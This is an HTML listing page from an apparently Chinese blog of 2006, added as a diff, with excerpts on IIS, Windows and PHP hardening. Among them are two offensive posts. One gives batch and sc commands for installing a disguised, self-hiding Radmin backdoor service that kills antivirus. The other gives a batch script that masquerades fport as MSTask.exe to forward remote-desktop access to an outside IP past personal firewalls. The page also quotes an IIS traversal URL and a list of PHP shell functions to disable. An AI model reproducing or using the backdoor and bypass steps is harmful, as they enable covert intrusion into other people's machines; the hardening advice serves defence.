@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head>
+	<meta name="generator" content="Hugo 0.109.0"><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>白天’s Blog</title>
+
+<meta name="description" content="">
+<meta name="author" content="">
+<link rel="canonical" href="http://example.org/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.bccfefac377bc340f06c260aed1bddf49a4354816d7c570d6aac75a997986c95.css" integrity="sha256-vM/vrDd7w0DwbCYK7Rvd9JpDVIFtfFcNaqx1qZeYbJU=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://example.org/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://example.org/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://example.org/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://example.org/apple-touch-icon.png">
+<link rel="mask-icon" href="http://example.org/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" type="application/rss+xml" href="http://example.org/index.xml">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="白天’s Blog" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="http://example.org/" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="白天’s Blog"/>
+<meta name="twitter:description" content=""/>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Organization",
+  "name": "白天’s Blog",
+  "url": "http://example.org/",
+  "description": "",
+  "thumbnailUrl": "http://example.org/favicon.ico",
+  "sameAs": [
+      
+  ]
+}
+</script>
+</head>
+
+<body class="list" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://example.org/" accesskey="h" title="白天’s Blog (Alt + H)">白天’s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main"> 
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>PHP木马的攻击的防御之道
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>1.防止跳出web目录　首先修改httpd.conf,如果你只允许你的php脚本程序在web目录里操作，还可以修改httpd.conf文件限制php的操作路径。比如你的web目录是/usr/local/apache/htdocs，那么在httpd.conf里加上这么几行：　php_admin_value open_basedir /usr/local/apache /htdocs 这样，如果脚本要读取/usr/local/apache/htdocs以外的文件将不会被允许，如果错误显示打开的话会提示这样的错误：
+Warning: open_basedir restriction in effect. File is in wrong directory in
+/usr/local/apache/htdocs/open.php on line 4
+等等。
+2.防止php木马执行webshell
+打开safe_mode,
+在,php.ini中设置
+disable_functions= passthru,exec,shell_exec,system　二者选一即可,也可都选</p>
+  </div>
+  <footer class="entry-footer"><span title='2006-02-25 16:17:53 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin</footer>
+  <a class="entry-link" aria-label="post link to PHP木马的攻击的防御之道" href="http://example.org/2006/02/25/phpe69ca8e9a9ace79a84e694bbe587bbe79a84e998b2e5bea1e4b98be98193/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>WIN服务器PHP软件下载
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>phpMyAdmin for Windows V2.7.0 http://www.skycn.com/soft/10687.html
+php-4.4.0 http://cn.php.net/get/php-4.4.0-Win32.zip/from/a/mirror
+mysql-4.0.26-win32 http://download.discuz.net/mysql-4.0.26-win32.zip
+ZendOptimizer-2.6.2-Windows-i386 http://www.mepoor.net/attachment/ZendOptimizer-2.6.2-Windows-i386.exe</p>
+  </div>
+  <footer class="entry-footer"><span title='2006-02-25 16:16:57 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin</footer>
+  <a class="entry-link" aria-label="post link to WIN服务器PHP软件下载" href="http://example.org/2006/02/25/wine69c8de58aa1e599a8phpe8bdafe4bbb6e4b88be8bdbd/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>给win2003打开fso读写权限
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>默认的windows2003是没有打开fso读写权限的,我用的是企业版的win2003,打开fso权限直截运行regsvr32 scrrun.dll即可.然后重启你的机算机,一切ok.</p>
+  </div>
+  <footer class="entry-footer"><span title='2006-02-25 16:16:09 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin</footer>
+  <a class="entry-link" aria-label="post link to 给win2003打开fso读写权限" href="http://example.org/2006/02/25/e7bb99win2003e68993e5bc80fsoe8afbbe58699e69d83e99990/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>打造完美Radmin
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>大家好，关于如何打造出完美的Radmin服务端，网上有很多类似的修改后的程序，但有的服务名会暴露，有的会显示CMD窗口，我弥补了它们的缺点，综合了它们的优点，打造出了现在这个完美的Radmin服务端。
+准备工具 Rock免杀工具； IcoSprite图标更改器； Killer15杀杀毒软件防火墙工具； SC.exe服务添加删除更改工具； AdmDll.dll、Raddrv.dll、R_server（这个不用说了吧，Radmin的服务端）。
+程序特点 自解压形式，双击即可，自动解压到%systemroot%\system32\drivers\目录下，并能干掉卡巴斯基等杀毒软件。使用vbs嵌套bat来执行所有内容，不会跳出任何窗口。自建服务，并修改服务名、显示名、描述使其做到隐蔽。依存Windows Update服务，给试图关闭它带来困惑。做完一切后以只读，隐藏形式隐蔽Radmin服务端的三个程序，删除掉生成的一些REG、BAT、VBS文件，并能够突破Radmin外部连接进来时XP SP2防火墙的拦截。
+制作过程 首先自己安装一下Radmin服务端，配置完密码，端口等信息后导出其在HKEY_LOCAL_MACHINE\SYSTEM\RAdmin的注册表文件，这里我另存为名Server.reg。然后要修改R_server.exe的图标并修改文件名为迷惑性文字如Update.exe，修改图标我用IcoSprite，觉得还不错。这样假如对方装有天网之类防火墙的话，可以骗过一些菜鸟，同意允许对外连接。 接下来我们制作核心部分，最关键的BAT，重要的我将简单解释： @echo off @sc stop r_server ‘假如已经被装过R_server服务，先用SC将它停掉。 @sc delete r_server ‘将已经装过R_server服务删除。 @regedit /s server.reg @SC create MPservice BinPath= “%systemroot%\system32\drivers\Update.exe /service” type= own type= interact start= auto DisplayName= “Media Player of Remote Control Driver Update” ‘这句是用SC建立一个服务，服务名为Mpservice，路径Binpath为&#34;%systemroot%\system32\drivers\Update.exe /service&#34;，类型type为 own 与interact交互，启动类型start为 自动，显示名DisplayName为&#34;Media Player of Remote Control Driver Update&#34;。 @sc description MPservice “为Windows Media Player提供加载进程及驱动程序、库提供基层更新安全补丁的服务。” ‘这句是将MPservice服务的描述改为“为Windows Media Player提供加载进程及驱动程序、库提供基层更新安全补丁的服务。” @sc config wuauserv depend= MPservice ‘配置MPservice使wuauserv服务依存此服务（wuauserv可以根据自己喜欢改成其它服务，这里的wuauserv是系统在Windows Update 网站的自动更新服务）。这里的目的是迷惑管理员，使其不敢轻易停止我们生成的Radmin服务。 @echo Windows Registry Editor Version 5....</p>
+  </div>
+  <footer class="entry-footer"><span title='2006-02-25 16:15:24 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin</footer>
+  <a class="entry-link" aria-label="post link to 打造完美Radmin" href="http://example.org/2006/02/25/e68993e980a0e5ae8ce7be8eradmin/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>通杀国内防火墙
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>直以来都有一个梦想：偶要是能发现些漏洞或BUG什么的该多好啊！于是整天对着电脑瞎弄瞎研究，研究什么呢？研究如何突破防火墙（偶这里指的防火墙是软体型的个人防火墙，硬件的偶也没条件。）嘿嘿，你还别说，还真没白研究，还真给偶发现了大多数防火墙的通病。这个BUG能让我们欺骗防火墙来达到访外的目的，具体情况是怎么样的呢？请看下面的解说！ 首先，我要介绍一下Windows系统特性，当一个程序运行时，它不能删除，但却能够改名！而当系统里的被保护程序遭到删除或损坏或改名时系统就会及时调用备份文件给予还原！我再讲讲防火墙，大家都知道许多防火墙的“应用程序规则”里一般默认就会让IE浏览器（iexplore.exe）、Outlook Express（msimn.exe）、lsass.exe、spoolsv.exe、MSTask.exe、winlogon.exe、services.exe、svchost.exe通过，而大多的防火墙认为只要是与规则里的路径及文件名相同就Pass！以这样的检测方法来决定是否放行，但它却完全没考虑到如果是别的文件替换的呢？——就相当于古装片里的易容术，易容后就认不得了！这就给了我们机会，我们可以利用这个BUG来欺骗防火墙来达到访外的目的！ 小知识：其实现在大多木马采用的DLL插线程技术也就是利用了这个原理，它们首先隐蔽的开启一个认证放行的程序进程（如Iexplore.exe进程），接着把DLL型木马插入这个线程内，然后访外时就可轻松突破防火墙的限制了——因为防火墙是不会拦截已认证放行的程序的。 原理讲完了，我们现在讲讲该如何利用这个BUG了！这里我用虚拟机做实验，制造如下条件： 为了更符合现实，我给服务器安装了“天网防火墙”、Radmin（但由于防火墙指定了访问IP地址，所以没办法正常连接！），MSSQL SERVER、Serv-u。首先我们用常用的方法进行端口转发，看看防火墙有什么反应！ 第一步，启用AngelShell Ver 1.0里的Fport（用来进行端口转发的服务端，几乎可以转发任何端口），然后在本地用FportClient（用来进行端口转发的客户端）监听好！ 第二步，直接在CMDSHELL里运行“e:\www\fport.exe 4899 192.168.1.1 7788”，这时我们看到虚拟机里的“天网”对Fport马上进行了拦截。
+看到了吧！由于Fport并不是认证放行的，防火墙马上就进行了拦截！OK，现在我们实行欺骗计划，看偶如何突破防火墙的！还是执行第一步，然后新建一个批处理，内容如下： ren MSTask.exe MSTask1.exe ren fport.exe MSTask.exe MSTask.exe 4899 192.168.1.1 7788 Del %0 命名为go.bat，接着用SqlRootKit把“Fport.exe”和go.bat 一起copy到目标机子的c:\winnt\system32\（也就是MSTask所在的目录）在SqlRootKit里执行go.bat（注意如果要改MSTask.exe的名的话就需要有管理员权限）。 当FportClient出现“已经接受到远程计算机的连接！”时，用Radmin客户端连接本机的4899端口。
+我们已经成功突破限制（由于防火墙没有限制本地连接4899端口，我们用Fport转发了它的端口，登录时等于本地连接，因此我们能够成功连接），这样一来，我们本不能逃过防火墙的Fport便变成了一个有“插线程”技术的端口转发工具了！ 据我实验，国内的防火墙几乎无一例外的“拥有”这个BUG！虽然这个BUG不会带来什么大的危害，但总是给入侵者多了一个黑我们的机会！ WTF老大说独乐乐不如众乐乐，所以我还是公布出来了，一是可以让我们国内的防火墙有所改进，二是给网管们提个醒！由于小弟技术有限，难免会出现错误，欢迎各位指正批评。
+N/P （NetPatch） 来 源： 《黑客防线》</p>
+  </div>
+  <footer class="entry-footer"><span title='2006-02-25 16:14:44 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin</footer>
+  <a class="entry-link" aria-label="post link to 通杀国内防火墙" href="http://example.org/2006/02/25/e9809ae69d80e59bbde58685e998b2e781abe5a299/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>WIN2000服务器安全配置全攻略
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>WIN2000服务器安全配置全攻略：目前，WIN2000 SERVER是比较流行的服务器操作系统之一，但是要想安全的配置微软的这个操作系统，却不是一件容易的事。本文试图对win2000 SERVER的安全配置进行初步的探讨。
+一、 定制自己的WIN2000 SERVER
+1．版本的选择：WIN2000有各种语言的版本，对于我们来说，可以选择英文版或简体中文版，我强烈建议：在语言不成为障碍的情况下，请一定使用英文版。要知道，微软的产品是以Bug &amp; Patch而著称的，中文版的Bug远远多于英文版，而补丁一般还会迟至少半个月（也就是说一般微软公布了漏洞后你的机子还会有半个月处于无保护状况）
+2．组件的定制：win2000在默认情况下会安装一些常用的组件，但是正是这个默认安装是极度危险的（米特尼科说过，他可以进入任何一台默认安装的服务器，我虽然不敢这么说，不过如果你的主机是WIN2000 SERVER的默认安装，我可以告诉你，你死定了）你应该确切的知道你需要哪些服务，而且仅仅安装你确实需要的服务，根据安全原则，最少的服务&#43;最小的权限=最大的安全。典型的WEB服务器需要的最小组件选择是：只安装IIS的Com Files，IIS Snap-In，WWW Server组件。如果你确实需要安装其他组件，请慎重，特别是：Indexing Service, FrontPage 2000 Server Extensions, Internet Service Manager (HTML)这几个危险服务。
+3． 管理应用程序的选择
+选择一个好的远程管理软件是非常重要的事，这不仅仅是安全方面的要求，也是应用方面的需要。Win2000的Terminal Service是基于RDP（远程桌面协议）的远程控制软件，他的速度快，操作方便，比较适合用来进行常规操作。但是，Terminal Service也有其不足之处，由于它使用的是虚拟桌面，再加上微软编程的不严谨，当你使用Terminal Service进行安装软件或重起服务器等与真实桌面交互的操作时，往往会出现哭笑不得的现象，例如：使用Terminal Service重起微软的认证服务器（Compaq, IBM等）可能会直接关机。所以，为了安全起见，我建议你再配备一个远程控制软件作为辅助，和Terminal Service互补，象PcAnyWhere就是一个不错的选择。
+二、 正确安装WIN2000 SERVER
+1．分区和逻辑盘的分配，有一些朋友为了省事，将硬盘仅仅分为一个逻辑盘，所有的软件都装在C驱上，这是很不好的，建议最少建立两个分区，一个系统分区，一个应用程序分区，这是因为，微软的IIS经常会有泄漏源码/溢出的漏洞，如果把系统和IIS放在同一个驱动器会导致系统文件的泄漏甚至入侵者远程获取ADMIN。推荐的安全配置是建立三个逻辑驱动器，第一个大于2G，用来装系统和重要的日志文件，第二个放IIS，第三个放FTP，这样无论IIS或FTP出了安全漏洞都不会直接影响到系统目录和系统文件。要知道，IIS和FTP是对外服务的，比较容易出问题。而把IIS和FTP分开主要是为了防止入侵者上传程序并从IIS中运行。（这个可能会导致程序开发人员和编辑的苦恼，管他呢，反正你是管理员J）
+2．安装顺序的选择：不要觉得：顺序有什么重要？只要安装好了，怎么装都可以的。错！win2000在安装中有几个顺序是一定要注意的：
+首先，何时接入网络：Win2000在安装时有一个漏洞，在你输入Administrator密码后，系统就建立了ADMIN$的共享，但是并没有用你刚刚输入的密码来保护它，这种情况一直持续到你再次启动后，在此期间，任何人都可以通过ADMIN$进入你的机器；同时，只要安装一完成，各种服务就会自动运行，而这时的服务器是满身漏洞，非常容易进入的，因此，在完全安装并配置好win2000 SERVER之前，一定不要把主机接入网络。
+其次，补丁的安装：补丁的安装应该在所有应用程序安装完之后，因为补丁程序往往要替换/修改某些系统文件，如果先安装补丁再安装应用程序有可能导致补丁不能起到应有的效果，例如：IIS的HotFix就要求每次更改IIS的配置都需要安装（变不变态？）
+三、 安全配置WIN2000 SERVER
+即使正确的安装了WIN2000 SERVER，系统还是有很多的漏洞，还需要进一步进行细致地配置。
+1．端口：端口是计算机和外部网络相连的逻辑接口，也是计算机的第一道屏障，端口配置正确与否直接影响到主机的安全，一般来说，仅打开你需要使用的端口会比较安全，配置的方法是在网卡属性-TCP/IP-高级-选项-TCP/IP筛选中启用TCP/IP筛选，不过对于win2000的端口过滤来说，有一个不好的特性：只能规定开哪些端口，不能规定关闭哪些端口，这样对于需要开大量端口的用户就比较痛苦。
+2．IIS：IIS是微软的组件中漏洞最多的一个，平均两三个月就要出一个漏洞，而微软的IIS默认安装又实在不敢恭维，所以IIS的配置是我们的重点，现在大家跟着我一起来：
+首先，把C盘那个什么Inetpub目录彻底删掉，在D盘建一个Inetpub（要是你不放心用默认目录名也可以改一个名字，但是自己要记得）在IIS管理器中将主目录指向D:\Inetpub；
+其次，那个IIS安装时默认的什么scripts等虚拟目录一概删除（罪恶之源呀，忘http://www.target.com/scripts/..%c1%1c../winnt/system32/cmd.exe了？我们虽然已经把Inetpub从系统盘挪出来了，但是还是小心为上），如果你需要什么权限的目录可以自己慢慢建，需要什么权限开什么。（特别注意写权限和执行程序的权限，没有绝对的必要千万不要给）
+第三，应用程序配置：在IIS管理器中删除必须之外的任何无用映射，必须指的是ASP, ASA和其他你确实需要用到的文件类型，例如你用到stml等（使用server side include），实际上90%的主机有了上面两个映射就够了，其余的映射几乎每个都有一个凄惨的故事：htw, htr, idq, ida……想知道这些故事？去查以前的漏洞列表吧。什么？找不到在哪里删？在IIS管理器中右击主机-&gt;属性-&gt;WWW服务编辑-&gt;主目录配置-&gt;应用程序映射，然后就开始一个个删吧（里面没有全选的，嘿嘿）。接着在刚刚那个窗口的应用程序调试书签内将脚本错误消息改为发送文本（除非你想ASP出错的时候用户知道你的程序/网络/数据库结构）错误文本写什么？随便你喜欢，自己看着办。点击确定退出时别忘了让虚拟站点继承你设定的属性。
+为了对付日益增多的cgi漏洞扫描器，还有一个小技巧可以参考，在IIS中将HTTP404 Object Not Found出错页面通过URL重定向到一个定制HTM文件，可以让目前绝大多数CGI漏洞扫描器失灵。其实原因很简单，大多数CGI扫描器在编写时为了方便，都是通过查看返回页面的HTTP代码来判断漏洞是否存在的，例如，著名的IDQ漏洞一般都是通过取1.idq来检验，如果返回HTTP200，就认为是有这个漏洞，反之如果返回HTTP404就认为没有，如果你通过URL将HTTP404出错信息重定向到HTTP404.htm文件，那么所有的扫描无论存不存在漏洞都会返回HTTP200，90%的CGI扫描器会认为你什么漏洞都有，结果反而掩盖了你真正的漏洞，让入侵者茫然无处下手（武侠小说中常说全身漏洞反而无懈可击，难道说的就是这个境界？）不过从个人角度来说，我还是认为扎扎实实做好安全设置比这样的小技巧重要的多。
+最后，为了保险起见，你可以使用IIS的备份功能，将刚刚的设定全部备份下来，这样就可以随时恢复IIS的安全配置。还有，如果你怕IIS负荷过高导致服务器满负荷死机，也可以在性能中打开CPU限制，例如将IIS的最大CPU使用率限制在70%。
+3．账号安全：
+Win2000的账号安全是另一个重点，首先，Win2000的默认安装允许任何用户通过空用户得到系统所有账号/共享列表，这个本来是为了方便局域网用户共享文件的，但是一个远程用户也可以得到你的用户列表并使用暴力法破解用户密码。很多朋友都知道可以通过更改注册表Local_Machine\System\CurrentControlSet\Control\LSA-RestrictAnonymous = 1来禁止139空连接，实际上win2000的本地安全策略（如果是域服务器就是在域服务器安全和域安全策略中）就有这样的选项RestrictAnonymous（匿名连接的额外限制），这个选项有三个值：
+0：None. Rely on default permissions（无，取决于默认的权限）...</p>
+  </div>
+  <footer class="entry-footer"><span title='2006-02-25 16:13:35 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin</footer>
+  <a class="entry-link" aria-label="post link to WIN2000服务器安全配置全攻略" href="http://example.org/2006/02/25/win2000e69c8de58aa1e599a8e5ae89e585a8e9858de7bdaee585a8e694bbe795a5/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>加固Wind2003平台的WEB服务器
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>基于Windows平台下IIS运行的网站总给人一种感觉就是脆弱。早期的IIS确实存在很多问题，不过我个人认为自从Windows Server 2003发布后，IIS6及Windows Server 2003新的安全特性、更加完善的管理功能和系统的稳定性都有很大的增强。虽然从Windows Server 2003上可以看到微软不准备再发展ASP，特别是不再对Access数据库的完好支持，但是面对它的那些优势迫使我不得不舍弃Windows 2000 Server。况且我也不需要运行太多的ASP&#43;Access，因为我的程序都是PHP&#43;MySQL(说实话我不喜欢微软的ASP和ASPNET)，而且我确实信赖Windows Server 2003!
+服务器、网站，看到这些词大家都会想到什么，不只是性能更加关注的是它的安全问题。很多人都无法做到非常完美的安全加固，因为大部分的资料都来源互联网，而互联网的资料总不是那么详尽，毕竟每个服务器的应用环境及运行程序不同。
+我从事互联网这个行业只有2年时间，其间遇到了很多问题，我所管理的服务器部分是开放式(PUBLIC)的，它是向互联网的用户敞开的，所以我所面临的问题就更加的多!安全性首当其要，其次是系统的稳定性，最后才是性能。要知道服务器上存在很多格式各样的应用程序，有些程序本身就有缺陷，轻者造成服务器当机，严重的会危及到服务器的整个数据安全。
+举个例子，有一台运行着300多个网站的Windows 2000 Server，一段时间里它经常Down机，发现内存泄漏特别快，几分钟时间内存使用立刻飙升到900M甚至高达1.2G，这个时候通过远程是无法访问服务器了，但是服务器系统本身却还在运行着。这个问题着实让我头疼了很长一段时间，因为如果要排查故障就要从这些网站入手，而网站的数量阻碍了我的解决进度。后来通过Filemon监控文件读取来缩小排查范围，之后对可疑网站进行隔离，最终找到故障点并解决。要知道一段小小的代码就可以让运行IIS5的 Windows 2000 Server 挂掉!而在Windows Server 2003下，应用程序的级别低中高级变更为了程序池，这样我们就可以对一个池进行设置对内存和CPU进行保护。它的这一特性让我减轻了很多的工作量并且系统也稳定了很多。
+另外严重的就是安全性的问题了，无论任何文章都有一个宗旨就是尽量在服务器少开放端口，并开放必要的服务，禁止安装与服务器无关的应用程序。在 Windows 2000 Server中，目录权限都是Everyone，很多服务都是以SYSTEM权限来运行的，如Serv-U FTP 这款出色的FTP服务器平台曾经害苦了不少人，它的溢出漏洞可以使入侵者轻松的获取系统完全控制权，如果做到呢?就是因为Serv-U FTP服务使用SYSTEM权限来运行，SYSTEM的权利比Administrator的权利可大的多，注册表SAM项它是可以直接访问和修改的，这样入侵者便利用这一特性轻松在注册表中克隆一个超级管理员账号并获取对系统的完全控制权限。
+我的目标:加固WEB服务器系统，使之提高并完善其稳定性及安全性。
+系统环境:Windows Server 2003 Enterprise Edition With Service Pack 1(以下简称W2k3SP1)，WEB平台为IIS6，FTP平台为Serv-U FTP Server
+安装配置操作系统
+安装操作系统，在安装前先要先去调整服务器的BIOS设置，关闭不需要的I/O，这样节省资源又可以避免一些硬件驱动问题。务必断开服务器与网络的连接，在系统没有完成安全配置前不要将它接入网络。在安装过程中如果网卡是PNP类型的，那么应当为其网络属性只配置允许使用TCP/IP协议，并关闭在 TCP/IP上的NETBIOS，为了提供更安全的保证，应该启用TCP/IP筛选，并不开放任何TCP端口。完成操作系统的安装后，首次启动 W2K3SP1，会弹出安全警告界面，主要是让你立刻在线升级系统更新补丁，并配置自动更新功能，这个人性化的功能是W2K3SP1所独有的，在没有关闭这个警告窗口前，系统是一个安全运行的状态，这时我们应当尽快完成系统的在线更新。
+修改Administrator和Guest这两个账号的密码使其口令变的复杂，并通过组策略工具为这两个敏感账号更名。修改位置在组策略中Computer Configuration-Windows Settings-Security Setting-Local Policies-Security Options下，这样做可以避免入侵者马上发动对此账号的密码穷举攻击。
+服务器通常都是通过远程进行管理的，所以我使用系统自带的组件 “远程桌面”来对系统进行远程管理。之所以选择它，因为它是系统自带的组件缺省安装只需要去启用它就可以使用，支持驱动器映射、剪切板映射等应用，并且只要客户端是WindowsXP PRO都会自带连接组件非常方便，最主要还有一点它是免费的。当然第三方优秀的软件也有如:PCAnyWhere，使用它可以解决Remote Desktop无法在本地环境模式下工作的缺点。为了防止入侵者轻易地发现此服务并使用穷举攻击手段，可以修改远程桌面的监听端口:
+运行 Regedt32 并转到此项: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
+注意:上面的注册表项是一个路径;它已换行以便于阅读。
+2. 找到“PortNumber”子项，您会看到值 00000D3D，它是 3389 的十六进制表示形式。使用十六进制数值修改此端口号，并保存新值。
+要更改终端服务器上某个特定连接的端口，请按照下列步骤操作: 运行 Regedt32 并转到此项:...</p>
+  </div>
+  <footer class="entry-footer"><span title='2006-02-25 16:12:03 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin</footer>
+  <a class="entry-link" aria-label="post link to 加固Wind2003平台的WEB服务器" href="http://example.org/2006/02/25/e58aa0e59bbawind2003e5b9b3e58fb0e79a84webe69c8de58aa1e599a8/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>如何设置虚拟主机访问权限
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>经常听到用户这样问冷刀:拥有虚拟站点的主机，该如何才能设置好用户的访问权呢? 笔者考虑了许久之后，决定借以此文回复“一度抱怨”冷刀没给答案的同志们! 其实这个问题提的很好，关于用户权限的设置确实里面蕴藏的很大的学文。权限小与大，是直接决定主机是否安全的关键，请看下文为您“量身”定做虚拟站点权限的套装! 1.首先双击“我的电脑”图标，进入操作界面。然后右击“D盘符”图标，弹出快捷菜单，选择“属性”选项，并单击“安全”栏，在到下方名称处选择Everyone用户组，并且勾选读取运行、列出文件目录、读取这三个权限，其它权限如有选中，请将其去掉。 2.单击“高级”按扭，弹出访问控制窗体，在次选择Everyone用户组，去掉“重置所有子对象的权限”复选框选项(如图1)，然后单击“确定”按钮。回到属性安全栏并选择Everyone用户组，最后单击右上角 “删除”按扭，将其删除即可。
+小提示:删除了EVERYONE用户组，含义是使普通用户不能越权，而且ASP还可以正常使用。为了安全起见，其它目录也按其相同操作即可。 3.右击桌面“我的电脑”图标，单击“管理”选项，弹出计算机管理窗体。展开左侧本地用户和组，选择下方“用户”标签，按右键弹出快捷菜单，单击“新建用户”按钮。输入:leilei，设置密码为永不过期(如图2)，再单击隶属于将其加入GUEST用户组。然后进入IIS设置虚拟站点，并设置站点目录为E:\网站资源\BBSXP 5.12 正式版 ]\bbsxp(如图3)，在单击目录安全性栏目“编辑”按扭，并勾选“匿名访问”复选框，设置用户名、密码与新建leilei用户相同，最后单击“确定”按钮即可。
+小提示: LEILEI这名用户是笔者随意建立的普通用户，大家在这里不必拘束，可以随意建立自己喜欢的名字。将LEILEI用户加入GUEST组，代表远程LEILEI用户可以访问本机。 然后并在IIS虚拟站点中设置了LEILEI这名用户访问权限，为远程来宾。 总结:就这样非常轻松的解决，LEILEI用户设置权限的问题。以上我们又做了非常健全的越权限制， 就算黑客得到了此用户，也只是来宾用户，丝毫危机不到你的电脑、IIS虚拟站点的安全问题，相信足以排除提升权限的忧患了。</p>
+  </div>
+  <footer class="entry-footer"><span title='2006-02-25 16:09:20 +0000 UTC'>February 25, 2006</span>&nbsp;·&nbsp;admin</footer>
+  <a class="entry-link" aria-label="post link to 如何设置虚拟主机访问权限" href="http://example.org/2006/02/25/e5a682e4bd95e8aebee7bdaee8999ae68b9fe4b8bbe69cbae8aebfe997aee69d83e99990/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>Windows2003下Asp配置技巧
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>装了2003以后，默认支持.net架构，抛弃了asp，所以刚刚安装了IIS的时候，访问是会出错的，错误提示为 Error Code 16389 超出系统资源 这是没有手动配置asp环境的缘故。
+在 IIS 6.0 中，默认设置是特别严格和安全的，这样可以最大限度地减少因以前太宽松的超时和限制而造成的攻击。比如说默认配置数据库属性实施的最大 ASP 张贴大小为 204,800 个字节，并将各个字段限制为 100 KB。在 IIS 6.0 之前的版本中，没有张贴限制。导致我们学校里面的应用系统往2003移植经常会出错。这几天走了几个学校发现了一些问题，现汇总解决方案如下。 一、启用Asp支持 Windows Server 2003 默认安装，是不安装 IIS 6 的，需要另外安装。安装完 IIS 6，还需要单独开启对于 ASP 的支持。
+第一步，启用Asp，进入： 控制面板 - 管理工具 -IIS(Internet 服务器)- Web服务扩展 - Active Server Pages - 允许 控制面板 - 管理工具 -IIS(Internet 服务器)- Web服务扩展 - 在服务端的包含文件 - 允许 第二步,启用父路径支持。 IIS-网站－主目录－配置－选项－启用父路径 第三步，权限分配 IIS-网站－（具体站点）－（右键）权限－Users完全控制
